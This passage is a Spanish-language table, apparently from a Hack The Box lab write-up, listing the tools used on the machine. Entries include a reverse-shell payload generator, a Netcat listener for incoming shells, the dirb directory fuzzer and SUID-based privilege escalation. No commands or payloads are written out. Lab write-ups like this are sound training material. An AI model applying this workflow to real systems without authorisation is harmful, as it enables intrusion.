| **Wappalyzer**           | Extensión de navegador | Fingerprinting de tecnologías web (lenguajes, frameworks, CMS).                                  | Firefox Add-ons / Chrome Web Store                        |
| **nano**                 | Editor de texto   | Editor de texto en terminal para crear y modificar archivos.                                         | Preinstalado en Kali Linux                                |
| **revshells.com**        | Plataforma web    | Generador online de payloads para reverse shells en múltiples lenguajes y sistemas operativos.       | `https://www.revshells.com`                               |
| **Netcat (nc)**          | Utilidad de red   | Herramienta de red multipropósito. Se utiliza para escuchar conexiones entrantes de reverse shells.  | Preinstalado en Kali Linux                                |
| **dirb**                 | Fuzzer web        | Realiza fuzzing de directorios y archivos en servidores web utilizando diccionarios.                 | Preinstalado en Kali Linux                                |
| **find**                 | Utilidad de sistema | Busca archivos y directorios en el sistema de ficheros según criterios de nombre, tipo, grupo, etc. | Nativo en Linux                                           |
| **cat**                  | Utilidad de sistema | Muestra el contenido de archivos en la salida estándar.                                            | Nativo en Linux (`/bin/cat`)                              |
| **ssh**                  | Protocolo / Cliente | Secure Shell. Permite sesiones remotas cifradas en sistemas Unix/Linux.                           | Preinstalado en Kali Linux                                |
| **chmod**                | Utilidad de sistema | Modifica los permisos de archivos y directorios.                                                   | Nativo en Linux                                           |
| **Hack The Box (HTB)**   | Plataforma        | Plataforma de práctica de ciberseguridad con máquinas vulnerables en entornos controlados.           | `https://www.hackthebox.com`                              |
| **VPN (tun0)**           | Red               | Interfaz de red virtual generada por la VPN de Hack The Box para conectarse al entorno de laboratorio. | Archivo `.ovpn` descargable desde HTB                  |
| **PHP**                  | Lenguaje / Tecnología | Lenguaje de scripting del lado del servidor utilizado por la aplicación vulnerable.             | Nativo en el servidor víctima                             |
| **SUID**                 | Mecanismo de permisos | Bit especial de permisos Linux que permite ejecutar un binario con los privilegios de su propietario. | Nativo en Linux                                        |
| **Bash**                 | Shell             | Intérprete de comandos de Linux. Utilizado en el payload de reverse shell y en la escalada.          | Nativo en Linux (`/bin/bash`)                             |
```
